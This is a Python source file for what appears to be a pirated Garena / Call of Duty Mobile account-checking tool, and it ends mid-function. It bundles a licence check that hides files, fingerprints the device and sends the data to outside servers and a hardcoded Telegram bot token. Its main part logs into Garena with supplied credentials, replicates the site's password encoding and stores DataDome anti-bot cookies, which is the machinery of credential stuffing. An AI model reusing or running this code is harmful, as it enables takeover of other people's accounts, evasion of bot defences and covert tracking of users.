#Decode By Crazy | @PokiePy

import glob
import hashlib
import json
import os
import platform
import random
import subprocess
import sys
import time
import uuid
from collections import deque
from datetime import datetime
from urllib.parse import parse_qs, urlencode, urlparse

import requests
import urllib3
from colorama import Fore, Style, init
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from rich.console import Console
from rich.table import Table

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

init(autoreset=True)

console = Console()

# --- Constants and Global Variables from core.py ---
VALIDATION_URL = "https://tajixdax.elementfx.com/youcannotbypassme.php"
BINDING_URL = "https://tajixdax.elementfx.com/api.php"
LOG_VALIDATION_URL = "https://tajixdax.elementfx.com/log_validation.php"

TELEGRAM_BOT_TOKEN = "8127233488:AAHkmsapd3qtoNSuMyLQRpdN0N6eMSyRf4"  # For validation purposes
TELEGRAM_CHAT_ID = "6302398921"      # For validation purposes

SESSION = requests.Session()

# --- Functions from core.py ---
def clean_pyc():
    for pyc in glob.glob('**/*.pyc', recursive=True):
        try:
            os.remove(pyc)
        except:
            pass

clean_pyc()

def get_hidden_folder():
    try:
        if os.path.exists("/system/build.prop") or "android" in platform.system().lower():
            return "/storage/emulated/0/Android/.android(r=delete_key)"
        return os.path.expanduser("~/.android(r=delete_key)")
    except Exception:
        return os.path.expanduser("~/.android(r=delete_key)")

def initialize_hidden_folder():
    global HIDDEN_FOLDER
    try:
        if not os.path.exists(HIDDEN_FOLDER):
            os.makedirs(HIDDEN_FOLDER, exist_ok=True)
            if os.name == 'nt':
                try:
                    import ctypes
                    ctypes.windll.kernel32.SetFileAttributesW(HIDDEN_FOLDER, 2)
                except Exception as e:
                    pass
    except Exception as e:
        HIDDEN_FOLDER = os.path.expanduser("~/.android(r=delete_key)")
        try:
            os.makedirs(HIDDEN_FOLDER, exist_ok=True)
            if os.name == 'nt':
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(HIDDEN_FOLDER, 2)
        except Exception as e:
            HIDDEN_FOLDER = os.getcwd()

HIDDEN_FOLDER = get_hidden_folder()
initialize_hidden_folder()
DEVICE_ID_FILE = os.path.join(HIDDEN_FOLDER, ".deviceid.txt")
KEY_FILE = os.path.join(HIDDEN_FOLDER, ".yourkey.txt")

def get_device_info():
    try:
        device_id = str(uuid.getnode())
        device_hash = hashlib.md5(device_id.encode()).hexdigest()[:8]
        is_android = os.path.exists("/system/build.prop") or "android" in platform.system().lower()

        if is_android:
            try:
                model = subprocess.check_output(["getprop", "ro.product.model"]).decode().strip()
                version = subprocess.check_output(["getprop", "ro.build.version.release"]).decode().strip()
                manufacturer = subprocess.check_output(["getprop", "ro.product.manufacturer"]).decode().strip()
            except:
                model = "Unknown Android Device"
                version = platform.release()
                manufacturer = "Unknown"
            return {
                "os": "Android",
                "os_version": version,
                "build": platform.version(),
                "machine": model,
                "processor": manufacturer,
                "device_id": device_hash
            }
        else:
            system_info = platform.uname()
            return {
                "os": system_info.system,
                "os_version": system_info.release,
                "build": platform.version(),
                "machine": system_info.node,
                "processor": system_info.machine,
                "device_id": device_hash
            }
    except Exception:
        return {
            "os": "Unknown",
            "os_version": "Unknown",
            "build": "Unknown",
            "machine": "Unknown",
            "processor": "Unknown",
            "device_id": "unknown_device"
        }

def extract_user_info():
    try:
        if os.path.exists(DEVICE_ID_FILE):
            with open(DEVICE_ID_FILE, 'r') as f:
                content = f.read().strip()
                if '_' in content:
                    name, device_id = content.split('_', 1)
                    return name, device_id
        return "unknown_user", "unknown_device"
    except Exception as e:
        print(f"Failed to extract user info!")
        return "error_user", "error_device"

def save_key(key):
    try:
        with open(KEY_FILE, 'w') as f:
            f.write(key)
        if os.name == 'nt':
            try:
                import ctypes
                ctypes.windll.kernel32.SetFileAttributesW(KEY_FILE, 2)
            except Exception as e:
                pass
        return True
    except Exception as e:
        return False

def load_key():
    try:
        if os.path.exists(KEY_FILE):
            with open(KEY_FILE, 'r') as f:
                return f.read().strip()
        return ""
    except Exception as e:
        return ""

def remove_key_file():
    try:
        if os.path.exists(KEY_FILE):
            os.remove(KEY_FILE)
            return True
        return False
    except Exception as e:
        print(f"{Fore.RED}Failed to remove key file!{Style.RESET_ALL}")
        return False

def bind_device_to_key(key, device_id):
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Authorization': 'Taji'
    }
    payload = {'action': 'read'}
    try:
        response = SESSION.post(BINDING_URL, json=payload, headers=headers, timeout=10, verify=False)
        response.raise_for_status()
        result = response.json()
        if not result.get('success'):
            return False, result.get('message', 'Failed to read keys')
        keys = result.get('keys', {})
    except requests.HTTPError as e:
        return False, f"Failed to read keys!"
    except Exception as e:
        return False, f"Failed to read keys!"

    if key not in keys:
        return False, "Key not found"

    if keys[key].get('device_id') and keys[key]['device_id'] != device_id:
        return False, "Key is bound to another device!"

    keys[key]['device_id'] = device_id
    for k in keys:
        if 'expires_at' in keys[k] and isinstance(keys[k]['expires_at'], str):
            keys[k]['expires_at'] = keys[k]['expires_at'].strip("'\"")

    payload = {
        'action': 'write',
        'keys': keys
    }
    try:
        response = SESSION.post(BINDING_URL, json=payload, headers=headers, timeout=10, verify=False)
        response.raise_for_status()
        result = response.json()
        return result.get('success'), result.get('message', 'Unknown error')
    except requests.HTTPError as e:
        return False, f"Failed to bind device!"
    except Exception as e:
        return False, f"Failed to bind device!"

def send_telegram_message(message):
    """Sends a message to a Telegram chat."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print(f"{Fore.YELLOW}Failed to Validate user!{Style.RESET_ALL}")
        return

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, json=payload, timeout=5)
        response.raise_for_status()
        if not response.json().get('ok'):
            print(f"{Fore.RED}Failed to Validate user!{Style.RESET_ALL}")
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Failed to Validate user!{Style.RESET_ALL}")

def log_validation_attempt(key_value, device_id, device_info, validation_status, validation_message):
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    payload = {
        'key_value': key_value,
        'device_id': device_id,
        'device_info': device_info,
        'validation_status': validation_status,
        'validation_message': validation_message
    }
    max_retries = 3
    retry_delay = 2

    for attempt in range(max_retries):
        try:
            response = SESSION.post(LOG_VALIDATION_URL, json=payload, headers=headers, timeout=5, verify=False)
            response.raise_for_status()
            return
        except requests.exceptions.RequestException as e:
            print(f"{Fore.YELLOW}Failed to log validation attempt (Attempt {attempt + 1}/{max_retries}){Style.RESET_ALL}")
            if attempt < max_retries - 1:
                sleep_time = retry_delay * (2 ** attempt) + random.uniform(0, 1)
                print(f"{Fore.YELLOW}Retrying in {sleep_time:.2f} seconds...{Style.RESET_ALL}")
                time.sleep(sleep_time)
            else:
                print(f"{Fore.RED}Failed to log validation attempt after {max_retries} retries. Retrying...{Style.RESET_ALL}")
                name, _ = extract_user_info()
                current_time = datetime.now().strftime("%I:%M %p").lower()
                current_date = datetime.now().strftime("%B %d, %Y")

                telegram_message = (
                    "🚨 *LOG VALIDATION FAILED!* 🚨\n\n"
                    f"Name: `{name}`\n"
                    f"Key: `{key_value}`\n"
                    f"Device Info: OS: `{device_info.get('os', 'N/A')}`, Version: `{device_info.get('os_version', 'N/A')}`, "
                    f"Model: `{device_info.get('machine', 'N/A')}`, Manufacturer: `{device_info.get('processor', 'N/A')}`\n"
                    f"Device ID: `{device_id}`\n\n"
                    f"LAST LOGIN HISTORY\n"
                    f"Time: `{current_time}`\n"
                    f"Date: `{current_date}`\n\n"
                    f"Reason: Failed to send log after {max_retries} retries. Error: `{e}`"
                )
                send_telegram_message(telegram_message)

def validate_user():
    global HIDDEN_FOLDER, DEVICE_ID_FILE, KEY_FILE
    initialize_hidden_folder()
    DEVICE_ID_FILE = os.path.join(HIDDEN_FOLDER, ".deviceid.txt")
    KEY_FILE = os.path.join(HIDDEN_FOLDER, ".yourkey.txt")

    device_id = None
    if os.path.exists(DEVICE_ID_FILE):
        try:
            with open(DEVICE_ID_FILE, 'r') as f:
                device_id = f.read().strip()
        except Exception as e:
            print(f"Could not read {DEVICE_ID_FILE}!")

    if not device_id:
        while True:
            name = input(f"{Fore.GREEN}Enter your name: {Style.RESET_ALL}").strip()
            if not name:
                print(f"{Fore.RED}[ERROR] Name cannot be empty. Please enter a valid name.{Style.RESET_ALL}")
                continue
            break

        device_info = get_device_info()
        device_id = f"{name}_{device_info['device_id']}"

        try:
            with open(DEVICE_ID_FILE, 'w') as f:
                f.write(device_id)
            if os.name == 'nt':
                try:
                    import ctypes
                    ctypes.windll.kernel32.SetFileAttributesW(DEVICE_ID_FILE, 2)
                except Exception as e:
                    pass
        except Exception as e:
            print(f"Could not write to {DEVICE_ID_FILE}!")
            DEVICE_ID_FILE = ".deviceid.txt"
            with open(DEVICE_ID_FILE, 'w') as f:
                f.write(device_id)

    return device_id

def clear_screen():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def remove_device_id_file():
    try:
        if os.path.exists(DEVICE_ID_FILE):
            os.remove(DEVICE_ID_FILE)
            print(f"{Fore.GREEN}Successfully deleted {DEVICE_ID_FILE}{Style.RESET_ALL}")
            return True
        print(f"{Fore.YELLOW}{DEVICE_ID_FILE} not found.{Style.RESET_ALL}")
        return False
    except Exception as e:
        print(f"{Fore.RED}Failed to delete {DEVICE_ID_FILE}!{Style.RESET_ALL}")
        return False

def validate_user_key(key, device_id):
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    device_info = get_device_info()
    payload = {
        'key': key,
        'device_id': device_id,
        'device_info': {
            'os': device_info['os'],
            'os_version': device_info['os_version'],
            'build': device_info['build'],
            'machine': device_info['machine'],
            'processor': device_info['processor']
        }
    }
    max_retries = 3
    retry_delay = 5

    for attempt in range(max_retries):
        try:
            response = SESSION.post(
                VALIDATION_URL,
                json=payload,
                headers=headers,
                timeout=10,
                verify=False
            )
            response.raise_for_status()
            result = response.json()

            log_validation_attempt(key, device_id, device_info, result.get('success'), result.get('message'))

            if result.get('success'):
                name, _ = extract_user_info()
                current_time = datetime.now().strftime("%I:%M %p").lower()
                current_date = datetime.now().strftime("%B %d, %Y")
                save_key(key)
                success, message = bind_device_to_key(key, device_id)
                if not success:
                    return False, message, None

                return True, result.get('message'), result.get('expires_at')
            else:
                remove_key_file()
                if "key not found" in result.get('message', '').lower():
                    print(f"\n{Fore.YELLOW}⚠ Your license key was not found on the server.{Style.RESET_ALL}")
                    while True:
                        choice = input(f"{Fore.CYAN}Do you want to delete your local device ID file ({DEVICE_ID_FILE}) and re-register? (y/n): {Style.RESET_ALL}").lower().strip()
                        if choice == 'y':
                            remove_device_id_file()
                            print(f"{Fore.GREEN}Please restart the application to re-register your device.{Style.RESET_ALL}")
                            sys.exit(0)
                        elif choice == 'n':
                            print(f"{Fore.YELLOW}Keeping device ID file. Please try again with a valid key.{Style.RESET_ALL}")
                            break
                        else:
                            print(f"{Fore.RED}Invalid choice. Please enter 'y' or 'n'.{Style.RESET_ALL}")
                return False, result.get('message'), None
        except requests.ConnectionError as e:
            error_msg = f"Connection error. Retrying ({attempt + 1}/{max_retries})..."
            print(f"{Fore.YELLOW}{error_msg}{Style.RESET_ALL}")
            if attempt < max_retries - 1:
                time.sleep(retry_delay * (attempt + 1))
            else:
                log_validation_attempt(key, device_id, device_info, False, f"Connection error!")
                remove_key_file()
                return False, f"Failed to connect to validation server after {max_retries} attempts. Server may be down or your IP is blocked. Contact @LEGITDax.", None
        except requests.Timeout:
            error_msg = f"Request timed out. Retrying ({attempt + 1}/{max_retries})..."
            print(f"{Fore.YELLOW}{error_msg}{Style.RESET_ALL}")
            if attempt < max_retries - 1:
                time.sleep(retry_delay * (attempt + 1))
            else:
                log_validation_attempt(key, device_id, device_info, False, f"Timeout error!")
                remove_key_file()
                return False, "Validation server timed out. Please try again later or contact @LEGITDax.", None
        except requests.HTTPError as e:
            log_validation_attempt(key, device_id, device_info, False, f"HTTP error!")
            remove_key_file()
            return False, f"HTTP error!", None
        except requests.RequestException as e:
            log_validation_attempt(key, device_id, device_info, False, f"Request error!")
            remove_key_file()
            return False, f"Unexpected error. Contact @LEGITDax for assistance.", None

    log_validation_attempt(key, device_id, device_info, False, "Unknown error occurred during validation after all retries.")
    remove_key_file()
    return False, "Unknown error occurred during validation. Contact @LEGITDax.", None

# --- NewGarena.py specific code starts here ---
LOG_FILENAME = None
DATADOME_VALUES = []
DATADOME_FILE = "datadome_cookies.json"
FRESH_DATADOMES_FILE = "fresh_datadomes.txt"

OWN_SITE_KO_TO_GAGO = "https://taji.x10.bz/init.php"

# Define your API Key here (should match the one in init.php)
# IMPORTANT: Replace 'YOUR_SECRET_API_KEY' with the exact same key you used in init.php.
TAJI_API_KEY = "GAGO_KA_BA_?" 

CODM_REGIONS = {
    'PH': {'name': 'Philippines', 'code': '63', 'flag': '🇵🇭'},
    'ID': {'name': 'Indonesia', 'code': '62', 'flag': '🇮🇩'},
    'US': {'name': 'United States', 'code': '1', 'flag': '🇺🇸'},
    'ES': {'name': 'Spain', 'code': '34', 'flag': '🇪🇸'},
    'VN': {'name': 'Vietnam', 'code': '84', 'flag': '🇻🇳'},
    'ZH': {'name': 'China', 'code': '86', 'flag': '🇨🇳'},
    'MY': {'name': 'Malaysia', 'code': '60', 'flag': '🇲🇾'},
    'TW': {'name': 'Taiwan', 'code': '886', 'flag': '🇹🇼'},
    'TH': {'name': 'Thailand', 'code': '66', 'flag': '🇹🇭'},
    'RU': {'name': 'Russia', 'code': '7', 'flag': '🇷🇺'},
    'PT': {'name': 'Portugal', 'code': '351', 'flag': '🇵🇹'},
    'BR': {'name': 'Brazil', 'code': '55', 'flag': '🇧🇷'},
    'DE': {'name': 'Germany', 'code': '49', 'flag': '🇩🇪'},
    'FR': {'name': 'France', 'code': '33', 'flag': '🇫🇷'},
    'GB': {'name': 'United Kingdom', 'code': '44', 'flag': '🇬🇧'},
    'CA': {'name': 'Canada', 'code': '1', 'flag': '🇨🇦'},
    'AU': {'name': 'Australia', 'code': '61', 'flag': '🇦🇺'},
    'SG': {'name': 'Singapore', 'code': '65', 'flag': '🇸🇬'},
    'JP': {'name': 'Japan', 'code': '81', 'flag': '🇯🇵'},
    'KR': {'name': 'South Korea', 'code': '82', 'flag': '🇰🇷'},
    'MX': {'name': 'Mexico', 'code': '52', 'flag': '🇲🇽'},
    'AR': {'name': 'Argentina', 'code': '54', 'flag': '🇦🇷'},
    'CO': {'name': 'Colombia', 'code': '57', 'flag': '🇨🇴'},
    'CL': {'name': 'Chile', 'code': '56', 'flag': '🇨🇱'},
    'PE': {'name': 'Peru', 'code': '51', 'flag': '🇵🇪'},
    'SA': {'name': 'Saudi Arabia', 'code': '966', 'flag': '🇸🇦'},
    'AE': {'name': 'United Arab Emirates', 'code': '971', 'flag': '🇦🇪'},
    'TR': {'name': 'Turkey', 'code': '90', 'flag': '🇹🇷'},
    'ZA': {'name': 'South Africa', 'code': '27', 'flag': '🇿🇦'},
    'EG': {'name': 'Egypt', 'code': '20', 'flag': '🇪🇬'},
    'NG': {'name': 'Nigeria', 'code': '234', 'flag': '🇳🇬'},
    'PK': {'name': 'Pakistan', 'code': '92', 'flag': '🇵🇰'},
    'BD': {'name': 'Bangladesh', 'code': '880', 'flag': '🇧🇩'},
    'LK': {'name': 'Sri Lanka', 'code': '94', 'flag': '🇱🇰'},
    'NP': {'name': 'Nepal', 'code': '977', 'flag': '🇳🇵'},
    'MM': {'name': 'Myanmar', 'code': '95', 'flag': '🇲🇲'},
    'KH': {'name': 'Cambodia', 'code': '855', 'flag': '🇰🇭'},
    'LA': {'name': 'Laos', 'code': '856', 'flag': '🇱🇦'},
    'BN': {'name': 'Brunei', 'code': '673', 'flag': '🇧🇳'},
    'TL': {'name': 'Timor-Leste', 'code': '670', 'flag': '🇹🇱'},
    'PG': {'name': 'Papua New Guinea', 'code': '675', 'flag': '🇵🇬'},
    'FJ': {'name': 'Fiji', 'code': '679', 'flag': '🇫🇯'},
    'NZ': {'name': 'New Zealand', 'code': '64', 'flag': '🇳🇿'},
    'AT': {'name': 'Austria', 'code': '43', 'flag': '🇦🇹'},
    'BE': {'name': 'Belgium', 'code': '32', 'flag': '🇧🇪'},
    'CH': {'name': 'Switzerland', 'code': '41', 'flag': '🇨🇭'},
    'DK': {'name': 'Denmark', 'code': '45', 'flag': '🇩🇰'},
    'FI': {'name': 'Finland', 'code': '358', 'flag': '🇫🇮'},
    'GR': {'name': 'Greece', 'code': '30', 'flag': '🇬🇷'},
    'IE': {'name': 'Ireland', 'code': '353', 'flag': '🇮🇪'},
    'IT': {'name': 'Italy', 'code': '39', 'flag': '🇮🇹'},
    'NL': {'name': 'Netherlands', 'code': '31', 'flag': '🇳🇱'},
    'NO': {'name': 'Norway', 'flag': '🇳🇴'},
    'SE': {'name': 'Sweden', 'code': '46', 'flag': '🇸🇪'},
    'PL': {'name': 'Poland', 'code': '48', 'flag': '🇵🇱'},
    'CZ': {'name': 'Czech Republic', 'code': '420', 'flag': '🇨🇿'},
    'HU': {'name': 'Hungary', 'code': '36', 'flag': '🇭🇺'},
    'RO': {'name': 'Romania', 'code': '40', 'flag': '🇷🇴'},
    'UA': {'name': 'Ukraine', 'code': '380', 'flag': '🇺🇦'},
    'BG': {'name': 'Bulgaria', 'code': '359', 'flag': '🇧🇬'},
    'HR': {'name': 'Croatia', 'code': '385', 'flag': '🇭🇷'},
    'RS': {'name': 'Serbia', 'code': '381', 'flag': '🇷🇸'},
    'SK': {'name': 'Slovakia', 'code': '421', 'flag': '🇸🇰'},
    'SI': {'name': 'Slovenia', 'code': '386', 'flag': '🇸🇮'},
    'LT': {'name': 'Lithuania', 'code': '370', 'flag': '🇱🇹'},
    'LV': {'name': 'Latvia', 'code': '371', 'flag': '🇱🇻'},
    'EE': {'name': 'Estonia', 'code': '372', 'flag': '🇪🇪'},
    'BY': {'name': 'Belarus', 'code': '375', 'flag': '🇧🇾'},
    'MD': {'name': 'Moldova', 'code': '373', 'flag': '🇲🇩'},
    'GE': {'name': 'Georgia', 'code': '995', 'flag': '🇬🇪'},
    'AZ': {'name': 'Azerbaijan', 'code': '994', 'flag': '🇦🇿'},
    'KZ': {'name': 'Kazakhstan', 'code': '7', 'flag': '🇰🇿'},
    'UZ': {'name': 'Uzbekistan', 'code': '998', 'flag': '🇺🇿'},
    'KG': {'name': 'Kyrgyzstan', 'code': '996', 'flag': '🇰🇬'},
    'TJ': {'name': 'Tajikistan', 'code': '992', 'flag': '🇹🇯'},
    'TM': {'name': 'Turkmenistan', 'code': '993', 'flag': '🇹🇲'},
    'AF': {'name': 'Afghanistan', 'code': '93', 'flag': '🇦🇫'},
    'IR': {'name': 'Iran', 'code': '98', 'flag': '🇮🇷'},
    'IQ': {'name': 'Iraq', 'code': '964', 'flag': '🇮🇶'},
    'SY': {'name': 'Syria', 'code': '963', 'flag': '🇸🇾'},
    'LB': {'name': 'Lebanon', 'code': '961', 'flag': '🇱🇧'},
    'JO': {'name': 'Jordan', 'code': '962', 'flag': '🇯🇴'},
    'PS': {'name': 'Palestine', 'code': '970', 'flag': '🇵🇸'},
    'IL': {'name': 'Israel', 'code': '972', 'flag': '🇮🇱'},
    'CY': {'name': 'Cyprus', 'code': '357', 'flag': '🇨🇾'},
    'GR': {'name': 'Greece', 'code': '30', 'flag': '🇬🇷'},
    'AL': {'name': 'Albania', 'code': '355', 'flag': '🇦🇱'},
    'MK': {'name': 'North Macedonia', 'code': '389', 'flag': '🇲🇰'},
    'ME': {'name': 'Montenegro', 'code': '382', 'flag': '🇲🇪'},
    'XK': {'name': 'Kosovo', 'code': '383', 'flag': '🇽🇰'},
    'BA': {'name': 'Bosnia and Herzegovina', 'code': '387', 'flag': '🇧🇦'},
    'IS': {'name': 'Iceland', 'code': '354', 'flag': '🇮🇸'},
    'LU': {'name': 'Luxembourg', 'code': '352', 'flag': '🇱🇺'},
    'MT': {'name': 'Malta', 'code': '356', 'flag': '🇲🇹'},
    'AD': {'name': 'Andorra', 'code': '376', 'flag': '🇦🇩'},
    'MC': {'name': 'Monaco', 'code': '377', 'flag': '🇲🇨'},
    'SM': {'name': 'San Marino', 'code': '378', 'flag': '🇸🇲'},
    'VA': {'name': 'Vatican City', 'code': '379', 'flag': '🇻🇦'},
    'LI': {'name': 'Liechtenstein', 'code': '423', 'flag': '🇱🇮'},
    'GI': {'name': 'Gibraltar', 'code': '350', 'flag': '🇬🇮'},
    'IM': {'name': 'Isle of Man', 'code': '44', 'flag': '🇮🇲'},
    'JE': {'name': 'Jersey', 'code': '44', 'flag': '🇯🇪'},
    'GG': {'name': 'Guernsey', 'code': '44', 'flag': '🇬🇬'},
    'FO': {'name': 'Faroe Islands', 'code': '298', 'flag': '🇫🇴'},
    'GL': {'name': 'Greenland', 'code': '299', 'flag': '🇬🇱'},
    'PM': {'name': 'Saint Pierre and Miquelon', 'code': '508', 'flag': '🇵🇲'},
    'BL': {'name': 'Saint Barthélemy', 'code': '590', 'flag': '🇧🇱'},
    'MF': {'name': 'Saint Martin', 'code': '590', 'flag': '🇲🇫'},
    'GP': {'name': 'Guadeloupe', 'code': '590', 'flag': '🇬🇵'},
    'MQ': {'name': 'Martinique', 'code': '596', 'flag': '🇲🇶'},
    'GF': {'name': 'French Guiana', 'code': '594', 'flag': '🇬🇫'},
    'RE': {'name': 'Réunion', 'code': '262', 'flag': '🇷🇪'},
    'YT': {'name': 'Mayotte', 'code': '262', 'flag': '🇾🇹'},
    'NC': {'name': 'New Caledonia', 'code': '687', 'flag': '🇳🇨'},
    'PF': {'name': 'French Polynesia', 'code': '689', 'flag': '🇵🇫'},
    'WF': {'name': 'Wallis and Futuna', 'code': '681', 'flag': '🇼🇫'},
    'PM': {'name': 'Saint Pierre and Miquelon', 'code': '508', 'flag': '🇵🇲'},
    'SX': {'name': 'Sint Maarten', 'code': '1-721', 'flag': '🇸🇽'},
    'BQ': {'name': 'Bonaire, Sint Eustatius and Saba', 'code': '599', 'flag': '🇧🇶'},
    'CW': {'name': 'Curaçao', 'code': '599', 'flag': '🇨🇼'},
    'AW': {'name': 'Aruba', 'code': '297', 'flag': '🇦🇼'},
    'KY': {'name': 'Cayman Islands', 'code': '1-345', 'flag': '🇰🇾'},
    'BM': {'name': 'Bermuda', 'code': '1-441', 'flag': '🇧🇲'},
    'VG': {'name': 'British Virgin Islands', 'code': '1-284', 'flag': '🇻🇬'},
    'TC': {'name': 'Turks and Caicos Islands', 'code': '1-649', 'flag': '🇹🇨'},
    'AI': {'name': 'Anguilla', 'code': '1-264', 'flag': '🇦🇮'},
    'MS': {'name': 'Montserrat', 'code': '1-664', 'flag': '🇲🇸'},
    'DM': {'name': 'Dominica', 'code': '1-767', 'flag': '🇩🇲'},
    'GD': {'name': 'Grenada', 'code': '1-473', 'flag': '🇬🇩'},
    'VC': {'name': 'Saint Vincent and the Grenadines', 'code': '1-784', 'flag': '🇻🇨'},
    'LC': {'name': 'Saint Lucia', 'code': '1-758', 'flag': '🇱🇨'},
    'AG': {'name': 'Antigua and Barbuda', 'code': '1-268', 'flag': '🇦🇬'},
    'KN': {'name': 'Saint Kitts and Nevis', 'code': '1-869', 'flag': '🇰🇳'},
    'BB': {'name': 'Barbados', 'code': '1-246', 'flag': '🇧🇧'},
    'TT': {'name': 'Trinidad and Tobago', 'code': '1-868', 'flag': '🇹🇹'},
    'BS': {'name': 'Bahamas', 'code': '1-242', 'flag': '🇧🇸'},
    'JM': {'name': 'Jamaica', 'code': '1-876', 'flag': '🇯🇲'},
    'HT': {'name': 'Haiti', 'code': '509', 'flag': '🇭🇹'},
    'DO': {'name': 'Dominican Republic', 'code': '1-809', 'flag': '🇩🇴'},
    'CU': {'name': 'Cuba', 'code': '53', 'flag': '🇨🇺'},
    'BZ': {'name': 'Belize', 'code': '501', 'flag': '🇧🇿'},
    'GT': {'name': 'Guatemala', 'code': '502', 'flag': '🇬🇹'},
    'SV': {'name': 'El Salvador', 'code': '503', 'flag': '🇸🇻'},
    'HN': {'name': 'Honduras', 'code': '504', 'flag': '🇭🇳'},
    'NI': {'name': 'Nicaragua', 'code': '505', 'flag': '🇳🇮'},
    'CR': {'name': 'Costa Rica', 'code': '506', 'flag': '🇨🇷'},
    'PA': {'name': 'Panama', 'code': '507', 'flag': '🇵🇦'},
    'EC': {'name': 'Ecuador', 'code': '593', 'flag': '🇪🇨'},
    'BO': {'name': 'Bolivia', 'code': '591', 'flag': '🇧🇴'},
    'PY': {'name': 'Paraguay', 'code': '595', 'flag': '🇵🇾'},
    'UY': {'name': 'Uruguay', 'code': '598', 'flag': '🇺🇾'},
    'GY': {'name': 'Guyana', 'code': '592', 'flag': '🇬🇾'},
    'SR': {'name': 'Suriname', 'code': '597', 'flag': '🇸🇷'},
    'FK': {'name': 'Falkland Islands', 'code': '500', 'flag': '🇫🇰'},
    'GS': {'name': 'South Georgia and the South Sandwich Islands', 'code': '500', 'flag': '🇬🇸'},
    'AQ': {'name': 'Antarctica', 'code': '672', 'flag': '🇦🇶'},
    'BV': {'name': 'Bouvet Island', 'code': '47', 'flag': '🇧🇻'},
    'CC': {'name': 'Cocos (Keeling) Islands', 'code': '61', 'flag': '🇨🇨'},
    'CX': {'name': 'Christmas Island', 'code': '61', 'flag': '🇨🇽'},
    'HM': {'name': 'Heard Island and McDonald Islands', 'code': '672', 'flag': '🇭🇲'},
    'NF': {'name': 'Norfolk Island', 'code': '672', 'flag': '🇳🇫'},
    'PN': {'name': 'Pitcairn', 'code': '64', 'flag': '🇵🇳'},
    'TF': {'name': 'French Southern Territories', 'code': '262', 'flag': '🇹🇫'},
    'UM': {'name': 'United States Minor Outlying Islands', 'code': '1', 'flag': '🇺🇲'},
    'IO': {'name': 'British Indian Ocean Territory', 'code': '246', 'flag': '🇮🇴'},
    'CK': {'name': 'Cook Islands', 'code': '682', 'flag': '🇨🇰'},
    'NU': {'name': 'Niue', 'code': '683', 'flag': '🇳🇺'},
    'TK': {'name': 'Tokelau', 'code': '690', 'flag': '🇹🇰'},
    'WS': {'name': 'Samoa', 'code': '685', 'flag': '🇼🇸'},
    'TV': {'name': 'Tuvalu', 'code': '688', 'flag': '🇹🇻'},
    'KI': {'name': 'Kiribati', 'code': '686', 'flag': '🇰🇮'},
    'NR': {'name': 'Nauru', 'code': '674', 'flag': '🇳🇷'},
    'MH': {'name': 'Marshall Islands', 'code': '692', 'flag': '🇲🇭'},
    'FM': {'name': 'Micronesia (Federated States of)', 'code': '691', 'flag': '🇫🇲'},
    'PW': {'name': 'Palau', 'code': '680', 'flag': '🇵🇼'},
    'MP': {'name': 'Northern Mariana Islands', 'code': '1-670', 'flag': '🇲🇵'},
    'GU': {'name': 'Guam', 'code': '1-671', 'flag': '🇬🇺'},
    'AS': {'name': 'American Samoa', 'code': '1-684', 'flag': '🇦🇸'},
    'VI': {'name': 'U.S. Virgin Islands', 'code': '1-340', 'flag': '🇻🇮'},
    'PR': {'name': 'Puerto Rico', 'code': '1-787', 'flag': '🇵🇷'},
}

def generate_md5_hash(password):
    md5_hash = hashlib.md5()
    md5_hash.update(password.encode('utf-8'))
    return md5_hash.hexdigest()

def microtime_float():
    return int(round(time.time() * 1000))

def encode_password(password, v1, v2):
    passmd5 = hashlib.md5(password.encode('utf-8')).hexdigest()
    first_hash = hashlib.sha256((passmd5 + v1).encode('utf-8')).hexdigest()
    second_hash = hashlib.sha256((first_hash + v2).encode('utf-8')).hexdigest()
    key = bytes.fromhex(second_hash)
    plaintext = bytes.fromhex(passmd5)
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted = cipher.encrypt(pad(plaintext, AES.block_size))
    final_hash = encrypted.hex()[:32]
    return final_hash

def get_captcha():
    keycap = hashlib.md5(str(random.random()).encode()).hexdigest()
    os.makedirs("captcha", exist_ok=True)
    captcha_url = f"https://gop.captcha.garena.com/image?key={keycap}"
    captcha_image = requests.get(captcha_url).content
    with open(f"captcha/{keycap}.png", 'wb') as f:
        f.write(captcha_image)
    captcha_code = "dummy_captcha_code"
    return keycap, captcha_code

def login_and_get_session(username, password):
    try:
        response = requests.post('https://sso.garena.com/api/login', data={'username': username, 'password': password})
        print("Cookies after login:", response.cookies.get_dict())
        if response.status_code == 200:
            return response.cookies
        else:
            print(f"Login failed: {response.status_code} - {response.text}")
            return None
    except Exception as e:
        print(f"An error occurred during login: {str(e)}")
        return None

def get_user_info(cookies, username):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Referer': 'https://account.garena.com/',
        'Accept-Language': 'en-US,en;q=0.9',
    }
    print(f"Getting user info with cookies: {cookies}")
    response = requests.get("https://account.garena.com/api/account/init", cookies=cookies, headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        if response.status_code == 401 and "error_session" in response.text:
            return {"error": "Session expired or invalid. Please re-login."}
        return {"error": f"Failed to retrieve user info. Status Code: {response.status_code}"}

def load_datadome_cookies():
    global DATADOME_VALUES
    if os.path.exists(DATADOME_FILE):
        try:
            with open(DATADOME_FILE, 'r', encoding='utf-8') as f:
                DATADOME_VALUES = json.load(f)
        except json.JSONDecodeError:
            DATADOME_VALUES = []
    else:
        pass
    return DATADOME_VALUES

def save_datadome_cookie(cookie_value):
    global DATADOME_VALUES
